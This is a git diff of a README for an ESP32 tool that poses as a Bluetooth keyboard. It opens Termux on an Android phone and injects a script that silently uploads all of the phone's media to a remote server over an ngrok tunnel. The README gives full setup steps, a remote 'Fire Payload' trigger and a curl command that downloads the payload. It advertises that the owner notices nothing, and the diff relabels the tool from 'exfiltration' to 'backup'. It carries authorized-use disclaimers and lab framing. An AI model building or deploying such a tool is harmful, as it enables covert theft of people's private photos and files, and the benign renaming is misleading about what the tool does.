@@ -1,8 +1,8 @@
-# ESP32 BLE HID — Android Media Exfiltration Lab
+# ESP32 BLE HID — Android Media Backup Lab
 
 > **CTF / Hardware Hacking Lab — Authorized Devices Only**
 
-A hardware security research project demonstrating how an ESP32, acting as a rogue Bluetooth HID keyboard, can silently automate command execution on an Android device and exfiltrate media files over an ngrok HTTPS tunnel — without the user touching the screen.
+A hardware security research project: an **ESP32 acts as a Bluetooth HID keyboard**, silently navigates to Termux on an Android device, and runs a Python script that uploads all media files to a **Flask server on your computer** — all triggered from a **web dashboard** with no physical button press needed.
 
 Built for **controlled lab environments**: CTF challenges, security awareness demos, red-team training, and personal hardware experimentation on devices you own.
 
@@ -17,35 +17,27 @@ You may ONLY use this tool on:
   - Devices you personally own, OR
   - Devices for which you have explicit written authorization from the owner.
 
-Connecting this device to any phone without the owner's knowledge and consent is:
-  - Unauthorized access to a computer system
-  - A criminal offense under:
-      India    : IT Act 2000, Sections 43 and 66
-      USA      : Computer Fraud and Abuse Act (CFAA), 18 U.S.C. § 1030
-      UK       : Computer Misuse Act 1990
-      EU       : Directive 2013/40/EU
-      + equivalent laws in every other jurisdiction
+Unauthorized use is a criminal offense under the IT Act (India), CFAA (USA),
+Computer Misuse Act (UK), and equivalent laws in every other jurisdiction.
 
-The author accepts no liability for misuse. By using this project you
-confirm that you have full legal authorization for every device you target.
+The author accepts no liability for misuse. By using this project you confirm
+that you have full legal authorization for every device you target.
 ```
 
 ---
 
 ## What This Does
 
-When the ESP32 connects to an Android phone over Bluetooth and the button on GPIO 19 is pressed, it behaves as a keyboard and silently:
+When triggered from the web dashboard (or by pressing the ESP32 button), the ESP32:
 
-1. Navigates to the Android home screen
-2. Opens **Termux** (must be pre-installed on the target device)
-3. Clears the terminal prompt
-4. Types and executes a bash heredoc script that:
-   - Loops through `/sdcard/DCIM/Camera`, `/sdcard/Pictures`, `/sdcard/Pictures/Screenshots`, `/sdcard/Download`, `/sdcard/Movies`
-   - Computes SHA-256 of every image and video file
-   - POSTs each file to your server via `curl` over ngrok HTTPS
-5. All received files are saved, logged, and displayed in a web gallery on your computer
-
-**The phone owner sees nothing while this is happening.** This is precisely what makes it a useful demonstration of BLE HID attack surface — and precisely why it must only ever be run on your own device or a device with written authorization.
+1. Opens **Termux** on the connected Android phone via BLE keystrokes
+2. Clears the terminal prompt cleanly
+3. Types and executes a **self-installing bash heredoc** that:
+   - Downloads `media_backup.py` from the server if not present
+   - Fetches and stores an auth token automatically
+   - Runs `media_backup.py --auto` — fully non-interactive
+4. `media_backup.py` scans all storage, computes SHA-256 hashes, and POSTs every file to the server via `curl` over an ngrok HTTPS tunnel
+5. Files appear instantly in the **web gallery** at `http://localhost:8019/files`
 
 ---
 
@@ -53,12 +45,51 @@ When the ESP32 connects to an Android phone over Bluetooth and the button on GPI
 
 | Technique | Description |
 |-----------|-------------|
-| BLE HID spoofing | ESP32 advertises as a legitimate Bluetooth keyboard |
-| Keystroke injection | Commands typed at 35 ms/char — fast enough to avoid notice |
-| Heredoc payload delivery | Full bash script injected without a file being dropped |
+| BLE HID spoofing | ESP32 advertises as "ESP32 Keyboard" — a legitimate Bluetooth HID device |
+| Keystroke injection | Commands typed at 35 ms/char — below human notice threshold |
+| Self-installing payload | Heredoc downloads and sets up the exfiltration script on first run |
+| Remote trigger | Web dashboard queues a command; ESP32 polls every 2 s and fires autonomously |
 | Out-of-band exfiltration | Files leave via HTTPS tunnel — bypasses most network monitoring |
-| SHA-256 integrity check | Server verifies every file, detects in-transit corruption |
-| Acquisition logging | CSV + JSON report + manifest file — mirrors forensic acquisition |
+| SHA-256 integrity | Server verifies every file on receipt |
+| Acquisition logging | CSV + JSON report + manifest — mirrors forensic acquisition workflow |
+
+---
+
+## Architecture
+
+```
+  ┌─────────────────────────┐
+  │    Web Dashboard         │  http://localhost:8019/dashboard
+  │  (Remote Trigger page)   │
+  └────────────┬────────────┘
+               │  POST /trigger
+               ▼
+  ┌─────────────────────────┐
+  │   Flask Server           │  port 8019  (macOS / Windows / Linux)
+  │   server/server.py       │  ← /api/poll, /upload, /files, /dashboard
+  └────────────┬────────────┘
+               │  ngrok HTTPS tunnel
+               │
+  ┌────────────┴────────────┐
+  │   ESP32 (WiFi + BLE)    │  polls /api/poll every 2 s
+  │   fetch_photos.ino      │
+  └────────────┬────────────┘
+               │  Bluetooth HID (keystrokes)
+               ▼
+  ┌─────────────────────────┐
+  │   Android Device        │  your lab phone
+  │   (Termux)              │
+  └────────────┬────────────┘
+               │  curl  HTTPS → ngrok → server
+               ▼
+  Android_Media_Backup/
+  ├── DCIM/        ← camera photos & videos
+  ├── Pictures/    ← gallery images
+  ├── Screenshots/
+  ├── Movies/
+  ├── Downloads/
+  └── Reports/    ← transfer.log, sha256_manifest.txt, .csv, .json
+```
 
 ---
 
@@ -67,43 +98,29 @@ When the ESP32 connects to an Android phone over Bluetooth and the button on GPI
 | Item | Notes |
 |------|-------|
 | ESP32 dev board | Any variant — WROOM-32, S2, S3, C3 |
-| Momentary push button | Wired between **GPIO 19** and **GND** |
 | Android phone (**yours**) | Termux installed from [F-Droid](https://f-droid.org/packages/com.termux/) |
 | Computer | macOS, Windows, or Linux — runs the receiver server |
 | Free ngrok account | Tunnel from [ngrok.com](https://ngrok.com) |
-
-**Wiring:** `ESP32 GPIO 19 → Button → GND` — no resistor needed (INPUT_PULLUP).
+| WiFi network | ESP32 and your computer must share the same ngrok-reachable URL |
 
 ---
 
-## Architecture
+## Project Structure
 
 ```
-[GPIO 19 button press]
-         │
-         ▼
-   ESP32 (BLE HID keyboard)
-         │  Bluetooth HID
-         ▼
-   Android device (your lab phone)
-         │  Termux opened, bash heredoc injected
-         │  find + sha256sum + curl per file
-         │
-         │  HTTPS (ngrok tunnel)
-         ▼
-   Receiver server — port 8019
-   (macOS / Windows / Linux)
-         │
-         ├── Android_Media_Backup/DCIM/
-         ├── Android_Media_Backup/Pictures/
-         ├── Android_Media_Backup/Screenshots/
-         ├── Android_Media_Backup/Movies/
-         ├── Android_Media_Backup/Downloads/
-         └── Android_Media_Backup/Reports/
-             ├── transfer.log
-             ├── sha256_manifest.txt
-             ├── acquisition_report.csv
-             └── acquisition_report.json
+esp32-android-media-backup/
+├── fetch_photos.ino          ← ESP32 firmware (BLE HID + WiFi polling)
+├── README.md
+├── LICENSE
+├── .gitignore
+└── server/
+    ├── server.py             ← Flask server — all endpoints + dashboard HTML + gallery
+    ├── start.sh              ← One-click launcher (macOS / Linux)
+    ├── start.bat             ← One-click launcher (Windows)
+    ├── requirements.txt      ← Flask + python-dotenv
+    ├── .env.example          ← Config template
+    └── payloads/
+        └── media_backup.py   ← Exfiltration client — runs inside Termux
 ```
 
 ---
@@ -114,15 +131,7 @@ When the ESP32 connects to an Android phone over Bluetooth and the button on GPI
 
 ### PART 1 — Get the Code
 
-**Step 1 — Install Git**
-
-| OS | Command |
-|----|---------|
-| macOS | `brew install git` |
-| Windows | Download from [git-scm.com](https://git-scm.com/download/win) |
-| Linux | `sudo apt install git` or `sudo dnf install git` |
-
-**Step 2 — Clone the repository**
+**Step 1 — Clone the repository**
 
 ```bash
 git clone https://github.com/darshakkanani/esp32-android-media-backup.git
@@ -131,9 +140,9 @@ cd esp32-android-media-backup
 
 ---
 
-### PART 2 — Install Prerequisites
+### PART 2 — Set Up the Server
 
-**Step 3 — Install Python 3**
+**Step 2 — Install Python 3**
 
 | OS | How |
 |----|-----|
@@ -142,7 +151,7 @@ cd esp32-android-media-backup
 | Ubuntu/Debian | `sudo apt install python3 python3-venv python3-pip` |
 | Fedora/RHEL | `sudo dnf install python3 python3-pip` |
 
-**Step 4 — Install ngrok**
+**Step 3 — Install ngrok**
 
 | OS | How |
 |----|-----|
@@ -150,26 +159,17 @@ cd esp32-android-media-backup
 | Windows | Download `ngrok.exe` from [ngrok.com/download](https://ngrok.com/download), add to PATH |
 | Linux | Download binary from [ngrok.com/download](https://ngrok.com/download) |
 
-Authenticate ngrok (one-time):
+Authenticate (one-time):
 ```bash
 ngrok config add-authtoken YOUR_NGROK_TOKEN
 ```
 Get your token from [dashboard.ngrok.com/get-started/your-authtoken](https://dashboard.ngrok.com/get-started/your-authtoken).
 
----
-
-### PART 3 — Set Up the Receiver Server
-
-**Step 5 — Go into the server folder**
-
-```bash
-cd esp32-android-media-backup/server
-```
-
-**Step 6 — Create a virtual environment and install dependencies**
+**Step 4 — Install Python dependencies**
 
 macOS / Linux:
 ```bash
+cd server
 python3 -m venv .venv
 source .venv/bin/activate
 pip install -r requirements.txt
@@ -177,68 +177,79 @@ pip install -r requirements.txt
 
 Windows (cmd):
 ```bat
+cd server
 python -m venv .venv
 .venv\Scripts\activate
 pip install -r requirements.txt
 ```
 
-> **Shortcut:** run `./start.sh` (macOS/Linux) or double-click `start.bat` (Windows) to do Steps 6–8 automatically.
+> **Shortcut:** `./start.sh` (macOS/Linux) or double-click `start.bat` (Windows) to do steps 4–7 automatically.
 
-**Step 7 — Generate a secret auth token**
+**Step 5 — Generate a secret upload token**
 
 ```bash
 python3 -c "import secrets; print(secrets.token_hex(32))"   # macOS / Linux
 python  -c "import secrets; print(secrets.token_hex(32))"   # Windows
 ```
 
-Save this token — you need it in Step 8 and again in Step 17 (Android).
+Save this string — you need it again in Step 13 (Android) and in the firmware (Step 10).
 
-**Step 8 — Create your `.env` file**
+**Step 6 — Generate a setup password**
+
+```bash
+python3 -c "import secrets; print(secrets.token_urlsafe(16))"
+```
+
+This is a separate short password used by the ESP32 to fetch the token automatically.
+
+**Step 7 — Create your `.env` file**
 
 ```bash
 cp .env.example .env   # macOS / Linux
 # copy .env.example .env   # Windows
 ```
 
-Edit `.env`:
-```
-UPLOAD_TOKEN=your_token_from_step_7_here
+Edit `server/.env`:
+```ini
+UPLOAD_TOKEN=your_token_from_step_5_here
+SETUP_PASSWORD=your_password_from_step_6_here
 ```
 
-**Step 9 — Start the ngrok tunnel**
+**Step 8 — Start the ngrok tunnel**
 
 Open a **new terminal window**:
 ```bash
 ngrok http 8019
 ```
 
-Copy the `https://xxxx.ngrok-free.app` URL from the output — needed in Steps 11 and 17.
+Copy the `https://xxxx.ngrok-free.app` URL — needed in Steps 10 and 12.
 
-**Step 10 — Start the receiver server**
+**Step 9 — Start the server**
 
 In a **second terminal window**:
 
 macOS / Linux:
 ```bash
-cd esp32-android-media-backup/server
+cd server
 source .venv/bin/activate
 python3 server.py
 ```
 
 Windows:
 ```bat
-cd esp32-android-media-backup\server
+cd server
 .venv\Scripts\activate
 python server.py
 ```
 
-The server prints the ngrok URL and all endpoints. Keep this window open during the lab.
+The server prints: `Running on http://0.0.0.0:8019`. Keep this window open during the lab.  
+Open the dashboard: **http://localhost:8019/dashboard**
 
 ---
 
-### PART 4 — Flash the ESP32
+### PART 3 — Flash the ESP32
 
-**Step 11 — Set up Arduino IDE**
+**Step 10 — Set up Arduino IDE**
 
 1. Download [Arduino IDE 2](https://www.arduino.cc/en/software).
 2. **File → Preferences → Additional Board URLs**, add:
@@ -247,34 +258,39 @@ The server prints the ngrok URL and all endpoints. Keep this window open during 
    ```
 3. **Tools → Board → Board Manager** → search `esp32` → install **"esp32 by Espressif Systems"**.
 4. **Tools → Manage Libraries** → search **"ESP32 BLE Keyboard"** → install (by T-vK).
+5. **Tools → Manage Libraries** → search **"ArduinoJson"** → install (by Benoit Blanchon).
 
-**Step 12 — Set your ngrok URL in the sketch**
+**Step 11 — Edit firmware credentials**
 
-Open `fetch_photos.ino`, line 32 — replace the placeholder with your ngrok URL from Step 9:
+Open `fetch_photos.ino` and update the top section:
+
 ```cpp
-#define WAN_SERVER_URL "https://xxxx.ngrok-free.app"
+#define WAN_SERVER_URL  "https://xxxx.ngrok-free.app"  // ← your ngrok URL (Step 8)
+#define WIFI_SSID       "YourWiFiName"                  // ← your WiFi SSID
+#define WIFI_PASSWORD   "YourWiFiPassword"              // ← your WiFi password
+#define SETUP_PASSWORD  "your_password_from_step_6"    // ← matches server .env
 ```
 
-**Step 13 — Upload to ESP32**
+**Step 12 — Upload to ESP32**
 
 1. Connect ESP32 via USB.
 2. **Tools → Board** → select your ESP32 model.
-3. **Tools → Port** → select the correct port.
-4. Click **Upload**.
+3. **Tools → Port** → select the correct COM port.
+4. Click **Upload** (Ctrl+U).
 
-> ⚠️ ngrok generates a new URL every time it restarts. Update line 32 and re-upload whenever this happens.
+> ⚠️ ngrok generates a new URL every restart. Update `WAN_SERVER_URL` and re-upload when this happens.
 
 ---
 
-### PART 5 — Prepare the Lab Android Device (your device)
+### PART 4 — Prepare the Android Device (your device)
 
-**Step 14 — Install Termux on your Android device**
+**Step 13 — Install Termux from F-Droid**
 
-Install from **F-Droid only** — [f-droid.org/packages/com.termux](https://f-droid.org/packages/com.termux/)
+Install from **F-Droid only**: [f-droid.org/packages/com.termux](https://f-droid.org/packages/com.termux/)
 
 The Play Store build is outdated and will not work.
 
-**Step 15 — Set up Termux**
+**Step 14 — Set up Termux**
 
 ```bash
 pkg update && pkg upgrade -y
@@ -284,87 +300,45 @@ termux-setup-storage
 
 Tap **Allow** when Android asks for storage permission.
 
-**Step 16 — Download the exfiltration client to your Android device**
-
-In Termux (replace URL with your ngrok URL from Step 9):
-```bash
-curl -s -L -H "ngrok-skip-browser-warning: true" \
-     -o ~/media_backup.py \
-     https://xxxx.ngrok-free.app/payloads/media_backup.py
-```
-
-**Step 17 — Set the auth token on your Android device**
-
-```bash
-echo "your_token_from_step_7_here" > ~/.backup_token
-chmod 600 ~/.backup_token
-```
-
-Must match the token in `.env` on your computer exactly.
-
-**Step 18 — Verify manually**
-
-Before using the ESP32 trigger, confirm everything works end-to-end:
-```bash
-python3 ~/media_backup.py https://xxxx.ngrok-free.app
-```
-
-You should see your media discovered by category. Type `all` and `y` to confirm an upload.
+> The script downloads `media_backup.py` and fetches the auth token automatically on first run. No manual file download required.
 
 ---
 
-### PART 6 — Wire the Button and Run the Lab
+### PART 5 — Pair Bluetooth and Run
 
-**Step 19 — Wire the button**
+**Step 15 — Pair the ESP32**
 
-```
-ESP32 GPIO 19  ──────[Button]────── GND
-```
+1. Power on the ESP32.
+2. On your Android device: **Settings → Bluetooth** → scan.
+3. Pair **"ESP32 Keyboard"**.
 
-**Step 20 — Pair Bluetooth on your Android device**
+The dashboard's Remote Trigger page shows:
+- 🟢 **ESP32 — Online** when the ESP32 is polling
+- 🟢 **Android — Paired & Connected** when Bluetooth is active
 
-1. **Settings → Bluetooth → scan for devices**.
-2. The ESP32 appears as **"ESP32 Keyboard"** — pair it.
+**Step 16 — Fire the payload**
 
-**Step 21 — Run the lab**
+1. Open the dashboard: **http://localhost:8019/dashboard → Remote Trigger**
+2. Select the file types you want to collect.
+3. Click **🚀 Fire Payload**.
 
-1. Confirm server (Step 10) and ngrok (Step 9) are running.
-2. Android device is unlocked, Bluetooth connected.
-3. **Press the GPIO 19 button.**
-4. The ESP32 injects keystrokes into your Android device — opens Termux, types and executes the exfiltration script.
-5. Files are uploaded to your server. `====== ALL DONE ======` appears in Termux.
-6. View collected files at `http://localhost:8019/files`.
+The ESP32 picks up the command within 2 seconds, opens Termux on the Android device, injects the heredoc, and uploads everything. Files appear in the gallery at `http://localhost:8019/files`.
 
 ---
 
-## Receiver Web Interface
+## Web Dashboard Pages
 
-| URL | Description |
-|-----|-------------|
-| `http://localhost:8019/files` | Gallery of all collected files, grouped by category |
-| `http://localhost:8019/report` | JSON report — counts, sizes, timestamps per category |
-| `http://localhost:8019/health` | Server status |
-
----
-
-## Collected Data Structure
-
-```
-Android_Media_Backup/
-├── DCIM/           ← Camera photos and videos
-├── Pictures/       ← Gallery saved images
-├── Screenshots/    ← Screen captures
-├── Movies/         ← Video files
-├── Downloads/      ← Downloaded files
-├── Other/          ← Uncategorized
-└── Reports/
-    ├── transfer.log              ← Full operation log
-    ├── sha256_manifest.txt       ← Hash of every collected file
-    ├── acquisition_report.csv    ← Spreadsheet-ready acquisition log
-    └── acquisition_report.json   ← Machine-readable report
-```
-
-Each file is saved as `YYYYMMDD_HHMMSS_<uuid>_<originalname>` and SHA-256 verified on receipt.
+| Page | URL path | Description |
+|------|----------|-------------|
+| **Overview** | `/dashboard` | KPIs, upload sparkline, storage donut, category breakdown |
+| **Backup History** | `/dashboard` → History | Per-file upload log with timestamps, size, category, speed |
+| **Storage** | `/dashboard` → Storage | Per-category size bars |
+| **Devices** | `/dashboard` → Devices | Per-IP device table (first seen, files, bytes) |
+| **Errors** | `/dashboard` → Errors | Failed uploads log |
+| **Remote Trigger** | `/dashboard` → Remote Trigger | File type selector, Fire Payload button, trigger log |
+| **Gallery** | `/files` | Masonry photo/video grid, lightbox, category filter, search |
+| **Report** | `/report` | JSON acquisition report |
+| **Health** | `/health` | Server liveness check |
 
 ---
 
@@ -372,31 +346,34 @@ Each file is saved as `YYYYMMDD_HHMMSS_<uuid>_<originalname>` and SHA-256 verifi
 
 | Problem | Fix |
 |---------|-----|
-| ESP32 opens the wrong app | Edit `.ino`: increase `openApp("Termux", 3000)` to `5000` and re-upload |
-| Keystrokes land in wrong window | Re-pair Bluetooth; ensure the device is unlocked and on home screen |
+| Termux doesn't open | In `.ino`, increase `APP_LOAD_MS` from 5000 to 8000 and re-upload |
+| Keystrokes land in wrong window | Re-pair Bluetooth; ensure Android is unlocked, on home screen |
 | "No media found" in Termux | Re-run `termux-setup-storage` and tap **Allow** |
-| Auth error on upload | Token in `~/.backup_token` must exactly match `UPLOAD_TOKEN` in `.env` |
-| Server unreachable | Check both ngrok (Step 9) and server (Step 10) windows are still open |
-| ngrok URL changed | Update line 32 in `fetch_photos.ino` and re-upload the sketch |
+| Auth error on upload | `UPLOAD_TOKEN` in `.env` must match what's stored in `~/.backup_token` |
+| Server unreachable | Check both ngrok (Step 8) and server (Step 9) terminals are running |
+| ngrok URL changed | Update `WAN_SERVER_URL` in `.ino` and re-upload |
 | Windows: `python` not found | Re-install Python, tick **"Add Python to PATH"** |
-| Linux: permission denied on start.sh | `chmod +x start.sh` |
+| Linux: `chmod +x start.sh` | `chmod +x server/start.sh` |
+| ESP32 not showing online | Check WiFi credentials in `.ino`, confirm ESP32 and server share the ngrok URL |
+| Fire button queued but nothing fires | ESP32 must be powered and on WiFi — command waits until it connects |
 
 ---
 
-## Project Files
+## API Reference
 
-```
-esp32-android-media-backup/
-├── fetch_photos.ino          ← ESP32 BLE HID firmware
-└── server/
-    ├── server.py             ← Receiver server (Flask, port 8019)
-    ├── start.sh              ← One-click launcher — macOS / Linux
-    ├── start.bat             ← One-click launcher — Windows
-    ├── requirements.txt      ← Python dependencies (Flask only)
-    ├── .env.example          ← Token config template
-    └── payloads/
-        └── media_backup.py   ← Exfiltration client — runs in Termux
-```
+| Method | Endpoint | Description |
+|--------|----------|-------------|
+| `POST` | `/upload` | Receive a file from Termux |
+| `GET` | `/files` | Web gallery of all files |
+| `GET` | `/health` | `{"status":"ok"}` |
+| `GET` | `/report` | JSON acquisition report |
+| `GET` | `/dashboard` | Web dashboard |
+| `GET` | `/api/stats` | Live stats polled by dashboard (JSON) |
+| `GET` | `/api/poll?ble=0\|1` | ESP32 heartbeat + command pick-up |
+| `POST` | `/trigger` | Queue a payload command for the ESP32 |
+| `GET/POST` | `/api/config` | Get/set active file extensions |
+| `GET` | `/setup-token` | Termux token bootstrap (requires `X-Setup-Password` header) |
+| `GET` | `/payloads/<file>` | Serve `media_backup.py` to Termux |
 
 ---
 
@@ -406,6 +383,7 @@ esp32-android-media-backup/
 - [BadUSB / BLE HID attack research](https://www.hak5.org/blogs/usb-rubber-ducky) — Hak5
 - [Termux](https://termux.dev) — Android terminal emulator
 - [ngrok](https://ngrok.com) — HTTPS tunneling
+- [Flask](https://flask.palletsprojects.com) — Python web framework
 
 ---
 
@@ -413,6 +391,6 @@ esp32-android-media-backup/
 
 MIT License — free to use, modify, and share for authorized purposes.
 
-> This project is provided for educational and research purposes only.
-> The author is not responsible for any misuse.
+> This project is provided for educational and research purposes only.  
+> The author is not responsible for any misuse.  
 > Use only on devices you own or have explicit written authorization to test.
